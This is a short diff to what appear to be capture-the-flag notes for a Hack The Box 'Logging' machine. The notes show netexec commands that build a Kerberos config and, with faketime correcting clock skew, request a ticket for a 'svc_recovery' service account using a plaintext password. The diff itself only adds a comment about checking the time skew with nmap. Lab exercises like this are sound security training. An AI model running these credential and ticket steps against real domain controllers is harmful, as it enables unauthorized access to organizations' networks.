@@ -33,6 +33,8 @@ netexec smb 10.129.28.224 --generate-krb5-file ~/HTB/Logging/krb5.conf
 
 export KRB5_CONFIG=/home/kali/HTB/Logging/krb5.conf
 
+# Determine time skew via SMB nmap scan
+
 faketime -f "+7h" netexec smb dc01.logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k --generate-tgt /home/kali/HTB/Logging/gmsatgt.ccache
 
 export KRB5CCNAME=/home/kali/HTB/Logging/gmsatgt.ccache
